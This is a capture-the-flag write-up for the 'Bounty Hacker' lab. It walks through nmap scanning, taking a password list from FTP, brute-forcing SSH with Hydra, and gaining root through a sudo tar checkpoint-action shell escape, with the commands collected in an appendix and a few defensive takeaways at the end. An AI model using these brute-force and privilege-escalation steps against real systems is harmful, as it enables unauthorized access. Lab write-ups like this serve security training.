# Bounty Hacker — CTF Write-up

## Overview

This challenge involved enumerating a target machine, recovering credentials from an FTP directory, leveraging a brute-force attack against SSH, and finally escalating privileges to root via a known `sudo` misconfiguration involving the `tar` utility.

The target host was identified as:

- IP: `10.114.176.21`
- Service profile: FTP, SSH, and HTTP exposed on the machine

> This walkthrough follows the complete attack path from reconnaissance to final root compromise.

---

## 1. Initial Reconnaissance and Service Enumeration

The first step was to identify open ports and running services.

```bash
nmap -sV 10.114.176.21
```

Observed results:

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-26 13:35 -0400
Nmap scan report for 10.114.176.21
Host is up (0.26s latency).
Not shown: 969 filtered tcp ports (no-response), 28 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### Findings

- Port 21: FTP service running `vsftpd 3.0.5`
- Port 22: SSH service running `OpenSSH 8.2p1`
- Port 80: HTTP service running `Apache 2.4.41`

![Placeholder: Nmap scan output](images/nmap-scan.png)

---

## 2. FTP Enumeration

The FTP service was the next likely source of user data and reusable credentials.

```bash
ftp 10.114.176.21
```

Once connected, the following files were discovered:

```text
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
```

### task.txt

```bash
cat task.txt
```

```text
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.
```

This appeared to be either a clue or a narrative hint, potentially relevant to the challenge theme and password conventions.

### locks.txt

```bash
cat locks.txt
```

This file contained a list of candidate passwords, including values such as:

```text
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
```

The password list clearly pointed to a wordlist-based credential attack, likely targeting the user `lin`.

![Placeholder: FTP directory listing and task file](images/ftp-enumeration.png)

---

## 3. Credential Attack Against SSH

A password brute-force attack was performed against the SSH service with the discovered username `lin` and the candidate list from `locks.txt`.

```bash
hydra -l lin -P locks.txt ssh://10.114.176.21
```

### Result

```text
[22][ssh] host: 10.114.176.21   login: lin   password: RedDr4gonS......
```

This successfully identified the valid SSH login credentials for the user `lin`.

---

## 4. Initial SSH Access and User Enumeration

The attacker then authenticated to the host via SSH.

```bash
ssh lin@10.114.176.21
```

After login, the machine quickly revealed the user environment and the local user flag.

```bash
lin@ip-10-114-176-21:~$ cd Desktop/
lin@ip-10-114-176-21:~/Desktop$ ls
lin@ip-10-114-176-21:~/Desktop$ cat user.txt
```

This file contained the user-level flag, confirming access to a valid low-privilege shell.

Next, the user checked their privilege profile:

```bash
sudo -l
```

Observed output:

```text
[sudo] password for lin:
Matching Defaults entries for lin on ip-10-114-176-21:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on ip-10-114-176-21:
    (root) /bin/tar
```

This is a classic privilege escalation condition: a user can run `/bin/tar` as root without a password.

> The `sudo -l` output is the key pivot point in this challenge. It reveals a direct path to root using a known tar-based privilege escalation technique.

![Placeholder: sudo -l output](images/sudo-l.png)

---

## 5. Privilege Escalation via Tar Exploit

The root-level privilege escalation was achieved using the `tar` binary with the `--checkpoint` and `--checkpoint-action` options. This method works by abusing `tar`'s ability to execute commands when it reaches a checkpoint during archiving.

```bash
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

The command executes `/bin/sh` as root because the `tar` process is running with elevated privileges through `sudo`.

### Result

```text
tar: Removing leading `/' from member names
# id
uid=0(root) gid=0(root) groups=0(root)
```

This confirms that the attacker now had a root shell.

---

## 6. Post-Exploitation and Root Flag Retrieval

With root access in place, the attacker navigated to the root directory and retrieved the root flag.

```bash
cd /root
ls
cat root.txt
```

Successful output:

```text
root.txt
```

The root flag was then read from `/root/root.txt`, completing the challenge.

---

## 7. Summary of the Exploit Chain

The challenge was solved through the following sequence:

1. Enumerated open services with `nmap`
2. Accessed FTP and identified credential material in `locks.txt` and `task.txt`
3. Bruteforced SSH credentials using Hydra
4. Logged in as `lin`
5. Identified `sudo` access to `/bin/tar` as root
6. Exploited the tar checkpoint command execution vulnerability
7. Obtained a root shell and captured the final flag

### Final Status

- User: `lin`
- Root compromise: successful
- Privilege escalation vector: `sudo tar` with `--checkpoint-action=exec=/bin/sh`

---

## 8. Defensive Takeaways

This challenge demonstrates several important security lessons:

- Unsecured credential material on FTP servers can expose valid login secrets.
- Brute-force protections and strong password hygiene are essential for SSH access.
- `sudo` configuration must be tightly restricted; allowing root execution of utilities like `tar` can create immediate privilege escalation paths.
- Security teams should regularly review `sudoers` policies and disable dangerous binary access where unnecessary.

---

## Appendix: Key Commands Used

```bash
nmap -sV 10.114.176.21
ftp 10.114.176.21
cat task.txt
cat locks.txt
hydra -l lin -P locks.txt ssh://10.114.176.21
ssh lin@10.114.176.21
sudo -l
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
id
cd /root
ls
cat root.txt
```

This completes the full compromise path for the `Bounty Hacker` CTF challenge.
